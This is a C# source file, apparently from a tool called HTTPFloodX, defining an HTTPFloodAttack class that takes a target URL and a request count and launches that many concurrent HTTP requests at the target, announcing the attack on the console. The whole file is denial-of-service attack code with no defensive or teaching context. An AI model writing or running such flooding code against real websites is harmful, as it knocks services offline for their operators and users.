using HTTPFloodX.Flooders.Interfaces;

namespace HTTPFloodX.Flooders
{
    // Class implementing the interface for HTTP flood attack
    public class HTTPFloodAttack : IHTTPFloodAttack
    {
        // Target URL and number of requests to be sent
        private string _targetUrl;
        private int _requestCount;

        // Constructor to initialize target URL and request count
        public HTTPFloodAttack(string targetUrl, int requestCount)
        {
            this._targetUrl = targetUrl;
            this._requestCount = requestCount;
        }

        // Method to start the HTTP flood attack asynchronously
        public async Task StartAttackAsync()
        {
            // Display a message indicating the start of the attack
            Console.WriteLine($"Attack launched on {_targetUrl} with {_requestCount} requests.");
            
            // List to hold tasks for sending HTTP requests
            List<Task<bool>> tasks = new List<Task<bool>>();

            // Loop to create and send HTTP requests asynchronously
            for (int i = 0; i < _requestCount; i++)
            {
                // Create an instance of the HTTP request with the target URL and request number
                IHTTPRequest request = new HTTPRequest(_targetUrl, i + 1);
                
                // Add the task of sending the request to the list of tasks
                tasks.Add(request.SendRequestAsync());
            }

            // Wait for all tasks (HTTP requests) to complete
            await Task.WhenAll(tasks);
        }
    }
}